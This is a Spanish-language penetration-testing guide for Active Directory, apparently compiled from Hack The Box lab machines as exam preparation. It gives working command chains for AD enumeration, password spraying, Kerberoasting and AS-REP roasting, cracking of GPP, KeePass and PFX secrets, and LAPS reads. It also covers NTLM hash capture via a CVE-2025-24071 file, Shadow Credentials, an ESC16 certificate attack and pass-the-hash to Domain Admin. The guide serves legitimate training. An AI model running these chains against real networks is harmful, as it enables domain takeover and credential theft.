# Guía Completa — Active Directory (de nmap a Domain Admin)

Documento único de flujo, construido y corregido tras 3 máquinas reales de práctica (HTB: Active, Forest, Sauna). Sigue el orden real de ataque a una máquina/set de AD. Cada comando tiene un comentario explicando **qué hace y por qué lo corres en ese momento**. Los bloques marcados con 🔴 son errores reales que salieron en práctica — no son hipotéticos, son los que de verdad te trabaron.

> Reglas del examen: Responder solo en modo análisis (nunca poisoning). Metasploit no sirve para pivotar. IA prohibida durante el examen real — esto es material de preparación.

---

## FASE 0 — Reconocimiento inicial (encontrar que es AD)

```bash
# rustscan es más rápido que nmap para el descubrimiento inicial de puertos.
rustscan -a <IP> --ulimit 5000 -- -sCV
```

```bash
# nmap puro — nunca te quedes solo con el top-1000
sudo nmap -p- --min-rate=5000 -T4 -Pn <IP> -oN nmap_allports.txt
sudo nmap -p<PUERTOS_ENCONTRADOS> -sCV -T4 -Pn <IP> -oN nmap_detail.txt
```

**Cómo saber que es Active Directory con solo mirar el nmap:**

| Puerto | Servicio | Por qué confirma AD |
|--------|----------|---------------------|
| 53 | DNS | AD suele ser su propio servidor DNS |
| 80/443 | HTTP(S) | Portales internos — a veces revelan nombres de empleados (ver Fase 1) |
| 88 | Kerberos | El protocolo de autenticación del dominio — ¡es un DC! |
| 135 | MSRPC | Llamadas a procedimiento remoto de Windows |
| 139/445 | SMB | Shares de red, enumeración de usuarios |
| 389/636 | LDAP / LDAPS | El directorio en sí |
| 464 | kpasswd | Cambio de contraseñas vía Kerberos |
| 3268/3269 | Global Catalog | Búsquedas across todo el forest |
| 5985/5986 | WinRM | Shell remota de PowerShell |
| 9389 | ADWS | AD Web Services |

```bash
# Descubrir el hostname/dominio real — NUNCA lo adivines
nxc smb <IP>
# Output: "(name:HOSTNAME) (domain:DOMINIO)" ← ESO es tu dominio real
```

```bash
# Agrega el DC a tu /etc/hosts INMEDIATAMENTE, con TODAS las formas del nombre.
# Sin esto, Kerberos y bloodhound-python fallan con errores de DNS confusos.
echo "<IP> <HOSTNAME>.<DOMINIO> <DOMINIO> <HOSTNAME>" | sudo tee -a /etc/hosts
# Ejemplo real: echo "10.129.74.144 SAUNA.EGOTISTICAL-BANK.LOCAL egotistical-bank.local SAUNA" | sudo tee -a /etc/hosts
```

> 🔴 **Error real visto en 2 de 3 máquinas:** si conectaste una VPN de un lab DISTINTO antes (ej: hiciste un módulo de Port Scanning y luego pasas a AD), tu `/etc/hosts` puede tener entradas VIEJAS de otro rango de IP que confunden todo. Revisa con `cat /etc/hosts` si hay entradas conflictivas antes de asumir que el problema es de la máquina actual.

---

## FASE 1 — Enumeración SIN credenciales

```bash
# Null session de SMB
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares

# RPC anónimo
rpcclient -U "" -N <IP>
#   enumdomusers     → lista usuarios del dominio
#   enumdomgroups    → lista grupos

# Enumeración automatizada combinada
enum4linux-ng -A <IP>

# LDAP con bind anónimo
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

```bash
# Shares — busca nombres propios (no C$/ADMIN$/IPC$)
smbclient -L //<IP>/ -N
smbclient //<IP>/<share> -N
#   ls / cd <carpeta> / get <archivo>
#   prompt OFF; recurse ON; mget *   ← descarga TODO recursivamente
```

**Qué buscar en shares:** `Groups.xml` (GPP, ver Fase 2), scripts de login, backups, notas con credenciales.

### Enumeración de usuarios vía WEB (si el puerto 80/443 está abierto)

Una web con nombres de empleados es otra fuente de usuarios — obtienes **nombres completos**, no usernames, así que hay que convertirlos.

```bash
# Enumera la web normalmente, encuentra la página con nombres de empleados
whatweb http://<IP>/
feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Genera variantes de username con `username-anarchy`:**
```bash
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
chmod +x username-anarchy

# Prueba con UN nombre primero para confirmar que funciona:
./username-anarchy John Smith
# → jsmith, john.smith, smithj, j.smith, johns, etc. (8-15 variantes por persona)
```

> 🔴 **Error real — heredoc de bash:** para crear un archivo con varios nombres de una vez, el bloque completo (incluyendo el `EOF` final) debe pegarse TODO JUNTO en la terminal, no línea por línea:
> ```bash
> cat <<EOF > nombres.txt
> Shaun Coins
> Sophie Driver
> Bowie Taylor
> EOF
> ```
> Verifica con `cat nombres.txt` que se creó bien antes de seguir.

> 🔴 **Error real — el loop generaba solo 1 variante por persona en vez de 10+:** la causa fue usar `while read -r linea` (una sola variable con "Nombre Apellido" junto) en vez de separar en dos campos. La versión que SÍ funciona:
> ```bash
> # MAL (genera solo 1 variante, rompe el paso de argumentos):
> while read -r linea; do ./username-anarchy $linea; done < nombres.txt
>
> # BIEN (separa nombre y apellido en variables distintas):
> while read -r nombre apellido; do ./username-anarchy "$nombre" "$apellido"; done < nombres.txt > users_generated.txt
> ```
> Confirma con `wc -l users_generated.txt` — debe ser MUCHO más que el número de personas (8-15x).

**Valida cuáles usernames generados existen REALMENTE en el dominio:**
```bash
nxc smb <IP> -u users_generated.txt -p '' 2>&1 | grep -v "STATUS_LOGON_FAILURE"
```

---

### Enumeración de usuarios por fuerza bruta de SIDs (`lookupsid`)

Alternativa más cuando `rpcclient enumdomusers` o LDAP no te dan la lista completa — `lookupsid` fuerza bruta los RIDs (los números al final del SID) contra el canal LSA, y suele revelar usuarios que otros métodos no muestran, incluso con una cuenta de bajo privilegio como `guest`:

```bash
impacket-lookupsid <dominio>/<user>:'<pass>'@<IP>
# Con guest y password vacío: impacket-lookupsid cicada.htb/guest:''@<IP>
```
Te devuelve TODO: usuarios, grupos, cuentas de máquina — con su RID. Es otra fuente más para cruzar, además de RPC y LDAP (ver Fase 3).

### 🔴 `smbclient`/`cat` con nombres de archivo que tienen ESPACIOS

Si `ls` dentro de `smbclient` te muestra un archivo como `Notice from HR.txt` (con espacios), **`get Notice from HR.txt` sin comillas falla** — la shell/smbclient interpreta cada palabra como un argumento separado, buscando un archivo llamado literalmente `Notice`.

```
# MAL — busca un archivo llamado "Notice", no existe:
smb: \> get Notice from HR.txt

# BIEN — todo el nombre entre comillas:
smb: \> get "Notice from HR.txt"
```
Mismo problema aplica a `cat` en Kali una vez descargado:
```bash
cat 'Notice from HR.txt'      # comillas, no cat Notice from HR.txt
```

---

## FASE 2 — Explotación de hallazgos comunes SIN credenciales de dominio

### GPP / Group Policy Preferences — credenciales cifradas en Groups.xml

```bash
cat Groups.xml
# Busca el atributo cpassword="..." — cifrado con una clave AES que Microsoft
# publicó públicamente por error hace años. Cualquiera puede descifrarlo.

gpp-decrypt '<VALOR_DE_CPASSWORD>'
# Te da la contraseña en texto plano. Revisa el atributo "userName" del mismo
# XML para saber a qué cuenta pertenece.
```

### Password spraying con usuarios enumerados
```bash
nxc smb <IP> -u users.txt -p ''
nxc smb <IP> -u users.txt -p 'Password123'
# OJO: puede bloquear cuentas si hay política de lockout agresiva.
```

### Otros patrones reales de credenciales en texto plano (además de GPP)

**1. Notas de "bienvenida"/onboarding en shares legibles por Guest/anónimo** — a veces literalmente un `.txt` con el password por defecto de una cuenta nueva:
```bash
smbclient //<IP>/<share> -U 'Guest'    # probar con Guest, no solo -N anónimo puro
smb: \> get "Notice from HR.txt"       # revisa TODO, incluso lo que suena a "recursos humanos"
```

**2. El campo "Description" de un usuario, visible en la enumeración normal con `nxc --users`** — a veces alguien dejó la contraseña ahí mismo, literalmente en la columna de descripción:
```bash
nxc smb <IP> -u '<user>' -p '<pass>' --users
# Lee la columna -Description- de CADA usuario, no solo el nombre — es fácil
# pasarla por alto si solo miras la lista de usernames.

# Vía LDAP (Hutch): nunca leas el volcado a ojo, FÍLTRALO siempre.
ldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=com" > ldap_dump.txt
grep -i -E "descr|pass|pwd|comment|info|key|secret" ldap_dump.txt
nxc ldap <IP> -u '' -p '' -M get-desc-users     # saca descripciones directo
```
> 🔴 **Una credencial que valida en SMB/LDAP pero NO en WinRM no es un callejón sin salida** (Hutch, [`writeups/hutch-laps-writeup.md`](writeups/hutch-laps-writeup.md)). Valídala por los 3 vectores (`nxc smb/ldap/winrm`); aunque no te dé shell, sirve para enumerar ACLs vía LDAP. La pregunta correcta no es *¿dónde puedo loguear?* sino **¿qué permisos tiene este usuario sobre otros objetos?** → si puede leer `ms-Mcs-AdmPwd` (LAPS) de un equipo, tienes el Administrator local de ese equipo (`nxc ldap <IP> -u <user> -p '<pass>' -M laps`).

**3. Scripts de automatización (`.ps1`, `.bat`) en shares, con credenciales hardcodeadas** — común en scripts de backup/sync que necesitan autenticarse sin intervención humana:
```powershell
# Dentro de un .ps1 descargado, busca patrones como:
# $password = ConvertTo-SecureString "..." -AsPlainText -Force
```

**4. Bases de datos de KeePass (`.kdbx`) en shares** — un gestor de passwords cifrado, con varias cuentas guardadas dentro. Crackearlo te da de golpe varias credenciales a la vez.
```bash
# keepass2john (de John Jumbo) SOLO soporta KDBX v2/v3 — con v4 falla con
# "File version '40000' is currently not supported!" — no pierdas tiempo ahí.

# Para KDBX v4, usa keepass4brute (ataca el archivo real con una wordlist,
# sin necesitar generar un hash intermedio):
sudo apt install keepassxc -y        # trae keepassxc-cli, que keepass4brute necesita
git clone https://github.com/r3nt0n/keepass4brute
cd keepass4brute
chmod +x keepass4brute.sh
./keepass4brute.sh /ruta/al/archivo.kdbx /usr/share/wordlists/rockyou.txt
```

**Una vez crackeado, lista y extrae las entradas guardadas:**
```bash
keepassxc-cli ls /ruta/al/archivo.kdbx            # lista los nombres de entradas
keepassxc-cli show /ruta/al/archivo.kdbx "<ENTRADA>" -s   # -s muestra el password (oculto por defecto)
```
> Las entradas pueden tener nombres de persona, pero **el password de una entrada no necesariamente pertenece al usuario de dominio con el mismo nombre** — prueba TODOS los passwords extraídos contra TODOS los usuarios conocidos:
> ```bash
> nxc smb <IP> -u users.txt -p passwords_extraidos.txt
> ```

Cada credencial nueva que encuentres por cualquiera de estas 4 vías: **pruébala de inmediato contra shares nuevos** — suele destapar el siguiente share con más acceso (patrón real: cred #1 → share con solo lectura nuevo → script/kdbx con cred #2 → shell).

> 🔴 **Regla de comillas en bash (te va a pasar con CUALQUIER password que tenga `!`, `$`, `` ` ``, o espacios):** usa SIEMPRE comillas simples `'...'` para passwords, nunca dobles `"..."`. Las dobles permiten expansión de variables (`$algo`) e historial de comandos (`!algo`), lo que rompe el comando o deja la terminal colgada esperando más input (`dquote>` o `>` suelto). Si tu terminal se queda en `dquote>`, escribe una comilla sola y Enter para cerrarla, o `Ctrl+C`.

---

## FASE 3 — Ya tienes UNA credencial de dominio (foothold en AD)

```bash
# 1. Confirma DÓNDE funcionan, escaneando el RANGO completo, no solo el DC
nxc smb <SUBNET>/24 -u '<user>' -p '<pass>'
# Busca "(Pwn3d!)" — significa admin local en esa máquina específica.
```

```bash
# 2. Enumeración con credenciales — mucho más rica que la anónima
nxc smb <IP> -u '<user>' -p '<pass>' --users
nxc smb <IP> -u '<user>' -p '<pass>' --groups
nxc smb <IP> -u '<user>' -p '<pass>' --shares
```

```bash
# 3. LDAP con credenciales y filtros específicos
# Básico: usuarios Y computadoras mezclados (las de máquina terminan en $)
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName -LLL

# Filtro para EXCLUIR cuentas de computadora:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(!(objectClass=computer)))" sAMAccountName -LLL

# Cuentas con SPN configurado (candidatas a Kerberoasting) — anticipa el vector:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName -LLL
```

```bash
# 4. RPC con credenciales — canal DISTINTO a LDAP, a veces revela usuarios que LDAP no
rpcclient -U "<user>%<pass>" <IP> -c "enumdomusers" | grep -oP '(?<=\[)[^\]]+(?=\] rid)' > users_rpc.txt
```

> 🔴 **Lección real (pasó en Forest):** AS-REP Roasting no encontraba ningún usuario vulnerable con la lista de LDAP. Al cruzar contra la lista de RPC, aparecieron 2 usuarios (`lucinda`, `mark`) que LDAP anónimo no había mostrado — el bind anónimo de LDAP puede tener restricciones de visibilidad que RPC/SAMR no tiene.
> ```bash
> diff <(sort users_ldap.txt) <(sort users_rpc.txt)
> ```
> **Siempre cruza al menos 2 fuentes de enumeración de usuarios antes de asumir que tu lista está completa.**

---

## FASE 4 — BloodHound (el mapa completo del dominio)

### Instalación
```bash
sudo apt install bloodhound -y
bloodhound-start
# Primera vez pide bloodhound-setup (acepta "y"). Abre Neo4j en :7474
# (paso INTERMEDIO, no la interfaz final) y te da user admin + pass para :8080.
```

### 🔴 Checklist de arranque si BloodHound no responde
Esto costó más de 30 minutos reales de diagnóstico — sigue este orden exacto:

```bash
# 1. ¿Ya está arriba, o la terminal solo parece colgada?
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
# 200 = ya está arriba. 000 = sigue caído.

# 2. LA CAUSA #1 MÁS COMÚN: Postgres "parece" activo pero NO lo está.
#    systemctl status postgresql puede decir "active (exited)" — ESO ES MENTIRA,
#    es solo un servicio meta. Verifica la instancia REAL:
sudo pg_lsclusters
# Si Status dice "down":
sudo pg_ctlcluster <VERSION_EXACTA_MOSTRADA> main start
# ejemplo real: sudo pg_ctlcluster 18 main start

# 3. Confirma Neo4j por separado:
ps aux | grep neo4j
sudo neo4j start    # si no hay proceso vivo (usa "start", no "console", para no bloquear la terminal)

# 4. Reinicia el backend y confirma:
sudo systemctl restart bloodhound
sudo journalctl -u bloodhound -n 20 --no-pager -o cat   # -o cat evita que se corte el mensaje de error
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
```

### Generar y subir los datos
```bash
# -d es el DOMINIO (NO -g, rompe la resolución DNS)
# --zip es específico de BloodHound CE
bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -c all --zip
```

> 🔴 **Corre esto SIEMPRE desde tu propia carpeta de trabajo** (`cd ~/htbmachines` o similar), nunca desde `/` — puede fallar con `PermissionError: [Errno 13] Permission denied` al intentar escribir los `.json` en un directorio sin permisos de escritura para tu usuario.

> 🔴 **Si falla con `Name or service not known` o resuelve IPs IPv6 raras (`dead:beef::...`):** agrega el DC a `/etc/hosts` primero (Fase 0) y usa `-dc <HOSTNAME_COMPLETO>` explícito:
> ```bash
> bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -dc <HOSTNAME>.<dominio> -c all --zip
> ```

> 🔴 **Si falla con `KRB_AP_ERR_SKEW (Clock skew too great)`:** tu reloj de Kali está desincronizado con el del DC (Kerberos es muy estricto con el tiempo). Sincroniza:
> ```bash
> sudo ntpdate <DC_IP>
> # o si no tienes ntpdate: sudo timedatectl set-ntp true
> ```
> En la práctica, la herramienta suele caer automáticamente a NTLM y seguir funcionando igual — no siempre es bloqueante.

> 🔴 **Si da error LDAP `data 52e` (LOGON_FAILURE):** NO es un problema de BloodHound, son las credenciales. Señal de alerta clave: **si 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente, sospecha del dato copiado, no de la técnica.** Reescribe usuario y password A MANO, sin copiar/pegar.

Sube el `.zip` en `localhost:8080` → menú lateral → ícono de subida ("Upload Files" / "Quick Upload").

### Navegación — 3 pestañas
- **SEARCH**: busca tu usuario, revisa "Object Information" (¿Kerberoastable? ¿AS-REP roasteable? ¿Allows Unconstrained Delegation?).
- **PATHFINDING**: Start Node = tu usuario, End Node = `DOMAIN ADMINS@<DOMINIO>`. Más simple que Cypher, no necesita marcar "Owned".
- **CYPHER**: solo lectura en BloodHound CE (no `SET` para marcar Owned — usa Pathfinding).

```cypher
// Todos los edges de un tipo específico en todo el dominio
MATCH p=(n)-[:WriteDacl]->(m) RETURN p

// Cuentas Kerberoastable de un vistazo
MATCH (n:User {hasspn:true}) RETURN n
```

**Prioriza por familia de edge, no por número de saltos:**
```
1. ACL (GenericAll, WriteDacl, WriteOwner, AddMember, GetChanges/GetChangesAll...)
   → ejecutable YA, sin depender de nada más
2. Kerberos (Kerberoastable, AS-REPRoastable)
   → ejecutable YA, pero depende de crackear el hash
3. Sesión (HasSession, AdminTo hacia máquina que NO controlas)
   → esconde trabajo previo no mostrado en el grafo
```
**Ojo con la dirección de la flecha:** un edge DESDE un grupo administrativo HACIA tu usuario es la relación normal (te administran a ti) — no explotable. Solo importa si sale DESDE tu nodo HACIA el objetivo.

> **Nota real:** no todos los caminos son cadenas largas. En una máquina, `svc_loanmgr` tenía `GetChangesAll` **directo sobre el dominio, 1 solo salto** — sin ninguna cadena de grupos. Siempre revisa Pathfinding primero antes de asumir que necesitas una cadena compleja como en el ejemplo de Fase 8.

---

## FASE 5 — Ataques de Kerberos

```bash
# ── AS-REP Roasting ── (GetNPUsers, "NP" = No Preauth)
# Ataca cuentas con "Do Not Require Pre-Authentication" = TRUE.
# NO necesitas password válido si usas -usersfile con -no-pass.
impacket-GetNPUsers <dominio>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
# Hash: $krb5asrep$23$... → hashcat -m 18200

# ── Kerberoasting ── (GetUserSPNs, "SPN" = Service Principal Name)
# Ataca cuentas de SERVICIO (nombres tipo SVC_*) con SPN configurado.
# SÍ necesitas credenciales válidas de antemano.
impacket-GetUserSPNs <dominio>/<user>:<pass> -dc-ip <DC_IP> -request
# Hash: $krb5tgs$23$... → hashcat -m 13100
```

> 🔴 **CONFUSIÓN REAL más frecuente de las 3 máquinas:** `GetNPUsers` (AS-REP) y `GetUserSPNs` (Kerberoasting) atacan vulnerabilidades DISTINTAS en cuentas DISTINTAS. Si corres `GetNPUsers` y ves `"User X doesn't have UF_DONT_REQUIRE_PREAUTH set"` para TODOS tus usuarios, no es que el comando esté mal — significa que NINGUNO es AS-REP roasteable, y probablemente necesitas `GetUserSPNs` en su lugar (especialmente si ves cuentas con nombre `SVC_*`).
> **Regla mental:** nombre de cuenta de servicio (`SVC_algo`) → piensa Kerberoasting primero, no AS-REP.

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

---

## FASE 5b — Credenciales en archivos comprimidos/certificados (ZIP, PFX)

Caso real completo (máquina Timelapse). A veces un share SMB tiene un `.zip` protegido con password, y dentro un archivo `.pfx` (certificado + clave privada) que **también** está protegido con su propia password — dos capas de cracking antes de poder usar nada.

```bash
# 1. Crackear el ZIP
zip2john archivo.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt    # o: cat ~/.john/john.pot

unzip archivo.zip
# te pedirá la password que acabas de crackear
```

```bash
# 2. Un .pfx (certificado personal, formato PKCS#12) suele tener SU PROPIA password
pfx2john archivo.pfx > pfx_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx pfx_hash.txt
john --show --format=pfx pfx_hash.txt
```

### Convertir el PFX en cert + key para usarlo con evil-winrm

Un `.pfx` contiene certificado Y clave privada juntos — para autenticar con evil-winrm necesitas **separarlos** en dos archivos:

```bash
# Extrae la clave privada (key.pem) — necesitas la password del pfx que ya crackeaste
openssl pkcs12 -in archivo.pfx -nocerts -out key.pem -nodes
# Te pedirá la "Import Password" → es la password del pfx (ej: "thuglegacy")

# Extrae el certificado (cert.pem) — misma password
openssl pkcs12 -in archivo.pfx -clcerts -nokeys -out cert.pem
```
> `-nodes` en el primer comando = no cifrar la clave privada de salida (para no tener que meter otra password extra al usarla). `-nocerts`/`-clcerts` es lo que separa cert de key.

### Conectar con evil-winrm usando certificado (autenticación de cliente TLS, no usuario/password)

```bash
evil-winrm -i <IP> -c cert.pem -k key.pem -S
```
- `-c` → el certificado
- `-k` → la clave privada
- `-S` → SSL (este tipo de auth por certificado casi siempre corre sobre WinRM+TLS, puerto 5986)

**Esto autentica como el usuario al que pertenece ese certificado** (en el caso real, `legacyy`) — no necesitas su password en texto plano en absoluto, el certificado ES la credencial.

---

## FASE 5c — Credenciales en el historial de PowerShell (post-explotación, "qué hacer una vez dentro")

Una vez con shell, antes de pasar a winPEAS automatizado, revisa manualmente el historial de comandos del usuario — a veces alguien escribió una password en texto plano sin querer dejarla ahí:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Busca líneas con `ConvertTo-SecureString`, `PSCredential`, o cualquier password/usuario visible. Es un archivo que PowerShell mantiene automáticamente con cada comando que el usuario tecleó en sesiones anteriores — muy común encontrar ahí credenciales de otra cuenta usadas para pruebas.

---

## FASE 5d — LAPS (Local Administrator Password Solution)

**Qué es:** Microsoft LAPS asigna una password de Administrador **local** distinta y rotada automáticamente a cada máquina del dominio, guardándola cifrada en un atributo de AD (`ms-Mcs-AdmPwd` en la versión clásica). Si tu usuario tiene permiso de lectura sobre ese atributo, LAPS te da esa password en texto plano — no es una vulnerabilidad de LAPS en sí, es un permiso de lectura mal otorgado.

```bash
# Forma más rápida y directa — módulo dedicado de nxc
nxc ldap <IP> -u '<user>' -p '<pass>' -M laps
# Output: Computer:<HOSTNAME>$ User: Password:<password_texto_plano>
```

**Alternativas si `nxc -M laps` no está disponible:**
```powershell
# Desde una shell de Windows, con PowerShell nativo (necesita el módulo AD o RSAT)
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
# Busca en el output: ms-Mcs-AdmPwd (la password) y ms-Mcs-AdmPwdExpirationTime
```
```bash
# O vía LDAP directo
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=computer)" ms-Mcs-AdmPwd -LLL
```

**Con la password de LAPS obtenida — es del Administrador LOCAL de esa máquina específica, no del dominio:**
```bash
evil-winrm -i <IP> -u 'Administrator' -p '<password_de_laps>' -S
```

> **Con shell de Administrator, ya tienes acceso a TODO el sistema de archivos** — no necesitas "las credenciales de" ningún otro usuario para leer su flag. Simplemente navega a su carpeta:
> ```powershell
> dir C:\Users\<otro_usuario>\Desktop
> type C:\Users\<otro_usuario>\Desktop\root.txt
> ```
> No confundas "la flag está en el Desktop de X" con "necesito loguearme como X" — Administrator puede leer cualquier carpeta del sistema sin importar de quién sea.

---

## FASE 2b — Captura de hash vía archivo malicioso en un share (CVE-2025-24071, estilo library-ms)

Caso real (máquina Fluffy). Si encuentras un share SMB donde tienes permiso de **escritura**, y el PDF/notas de la máquina mencionan una CVE de "File Explorer Spoofing" o similar relacionada con `.library-ms`, el ataque es: subir un archivo especialmente armado que, cuando alguien (un proceso automatizado del dominio) lo indexa/abre, dispara una autenticación SMB hacia TU máquina — capturas su hash NTLMv2 sin que nadie haga click en nada de forma consciente.

```bash
# 1. Confirma que tienes escritura en el share (no solo lectura)
smbclient //<IP>/<share> -U '<user>'
smb: \> put archivo_prueba.txt    # si funciona, tienes escritura

# 2. Prepara el archivo malicioso (ej: con el PoC de la CVE específica)
# Busca el PoC exacto de la CVE que te señale el enunciado — suele ser un script
# que empaqueta un .library-ms dentro de un .zip con una ruta UNC apuntando a ti.
```

```bash
# 3. Levanta un listener para capturar la autenticación entrante
sudo responder -I tun0
# NOTA: en este caso Responder se usa como LISTENER pasivo para capturar la
# autenticación que el propio exploit provoca — no es poisoning de LLMNR/NBT-NS
# broadcast. Aun así, verifica la política exacta antes de usar esto en el
# examen real; el principio seguro es "solo modo análisis" salvo que el vector
# sea explícitamente parte de la cadena de un CVE específico documentado.
```

```bash
# 4. Sube el archivo malicioso al share con escritura
smbclient //<IP>/<share> -U '<user>' -c "put malicious.zip"
```

**Resultado esperado:** Responder captura un hash NetNTLMv2 de algún usuario del dominio. Crackéalo:
```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

---

## FASE 5f — Shadow Credentials (abuso de GenericWrite/GenericAll sobre una cuenta)

Caso real (máquina Fluffy). Si BloodHound muestra que tienes `GenericWrite` o `GenericAll` sobre una cuenta (no un grupo, una cuenta de usuario/servicio específica), una alternativa a resetear su password (que a veces rompe cosas o es detectado) es el ataque de **Shadow Credentials**: agregas tu propia "credencial de certificado" al atributo `msDS-KeyCredentialLink` de esa cuenta, lo que te permite autenticar como ella usando un certificado que TÚ generaste, sin tocar su password en absoluto.

```bash
# Con certipy (ya lo necesitas para la fase de AD CS, así que es la misma herramienta)
certipy shadow auto -u '<tu_usuario>@<dominio>' -p '<tu_pass>' -dc-ip <DC_IP> -account '<cuenta_objetivo>'
```
Esto te genera un certificado y, con él, recupera el **hash NT** de la cuenta objetivo directamente — sin necesitar crackear nada, sin resetear su password.

**Alternativa con `pywhisker`** (si `certipy shadow` no está disponible o da error):
```bash
python3 pywhisker.py -d '<dominio>' -u '<tu_usuario>' -p '<tu_pass>' --target '<cuenta_objetivo>' --action add
```

> 🔴 **Si certipy da error de reloj/tiempo al autenticar** (`KRB_AP_ERR_SKEW` u otro error de validez de certificado), antepón `faketime` sincronizado con el reloj del DC a CUALQUIER comando de certipy que falle por esto:
> ```bash
> faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" certipy shadow auto -u '...' -p '...' -dc-ip <DC_IP> -account '...'
> ```
> Esto pasa seguido con certificados porque son mucho más estrictos con la hora que NTLM — un desfase de unos minutos entre tu Kali y el DC puede invalidar el certificado completo, aunque todo lo demás esté bien.

**Con el hash NT obtenido, movimiento lateral normal (Fase 6):**
```bash
evil-winrm -i <IP> -u '<cuenta_objetivo>' -H '<NT_HASH>'
```

### Alternativa cuando `net rpc`/`ldapmodify` fallan para unirte a un grupo — `bloodyAD`

Ya documentamos en Fase 8 que `net rpc group addmem` puede fallar silenciosamente, y la alternativa era LDAP directo (`ldapmodify`). **`bloodyAD`** es otra alternativa, más simple de usar cuando funciona (requiere resolver antes el conflicto de dependencias de `cryptography` — ver nota en Fase 8):
```bash
bloodyAD -u '<tu_usuario>' -p '<tu_pass>' -d <dominio> --host <DC_IP> add groupMember '<GRUPO>' '<tu_usuario>'
```

---

## FASE 8c — Active Directory Certificate Services (AD CS) / ESC16 con Certipy

**Qué es AD CS:** un servicio de Windows que emite certificados digitales dentro del dominio. Mal configurado, un certificado puede usarse para **autenticar como cualquier usuario** (incluido Administrator) sin conocer su password — es un vector de escalada completo, paralelo a DCSync/ACL, y cada vez más común en máquinas/examen recientes.

**ESC16 específicamente:** la CA (Certificate Authority) tiene deshabilitada una "extensión de seguridad" que normalmente ata el certificado emitido al SID de la cuenta que lo pidió. Sin esa extensión, puedes **cambiar el UPN (User Principal Name) de una cuenta que ya controles** (ej: una cuenta de servicio donde conseguiste el hash vía Shadow Credentials) a `administrator`, pedir un certificado para esa cuenta, y el certificado resultante sirve para autenticar como el Administrator real.

```bash
# 1. Enumera si la CA tiene ESC16 (o cualquier otra vulnerabilidad de plantillas)
certipy find -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -vulnerable -enabled -stdout
# Busca en el output: "ESC16 : Security Extension is disabled."
```

```bash
# 2. Cambia el UPN de tu cuenta controlada a "administrator"
#    (esto es lo que hace que el certificado, al pedirse, quede vinculado a esa identidad)
certipy account update -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn 'administrator' -dc-ip <DC_IP>
```

```bash
# 3. Pide el certificado como esa cuenta (ahora con UPN "administrator")
certipy req -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -target <HOSTNAME_FQDN_DC> -ca '<NOMBRE_CA>' -template 'User'
# Te genera administrator.pfx
```

```bash
# 4. Autentica con ese certificado para obtener el hash NT real de Administrator
#    (de nuevo, si hay desfase de reloj, antepón faketime)
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <dominio>
```

```bash
# 5. IMPORTANTE — restaura el UPN de la cuenta que modificaste a su valor original
#    cuando termines, es buena práctica (y a veces necesario para no romper otra cosa)
certipy account update -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn '<cuenta_con_hash>@<dominio>' -dc-ip <DC_IP>
```

**Con el hash NT de Administrator obtenido en el paso 4 — Pass-the-Hash normal (Fase 9).**

> 🔴 **Usa SIEMPRE la versión más reciente de `certipy`.** Varios writeups de esta misma máquina mencionan explícitamente que versiones viejas de certipy no detectan ESC16 correctamente o fallan en el flujo. Actualiza antes de asumir que la técnica no aplica:
> ```bash
> pip install certipy-ad --upgrade --break-system-packages
> # o, si usas venv (recomendado dado los conflictos de cryptography ya documentados):
> python3 -m venv ~/venv-certipy && source ~/venv-certipy/bin/activate && pip install certipy-ad
> ```

> **Cadena completa de la máquina real que motivó esta sección:** share con escritura → CVE-2025-24071 + Responder → hash de un usuario #1 → ACL (`GenericWrite`) sobre cuentas de servicio → Shadow Credentials → hash de cuenta de servicio #2 (`ca_svc`) → `certipy find` revela ESC16 → cambiar UPN → pedir certificado → `certipy auth` (con `faketime` si hace falta) → hash de Administrator.

---

## FASE 5e — Abuso de `SeBackupPrivilege` (leer archivos protegidos sin ser Administrator)

Caso real (máquina Return). Ves en `whoami /priv` que tienes `SeBackupPrivilege Enabled`, y como Administrator es propietario de un archivo (ej: `root.txt` en su Desktop), intentas leerlo con `type`/`Get-Content` y da `Access is denied` — **incluso descargándolo con evil-winrm `download` llega vacío (0 bytes)**.

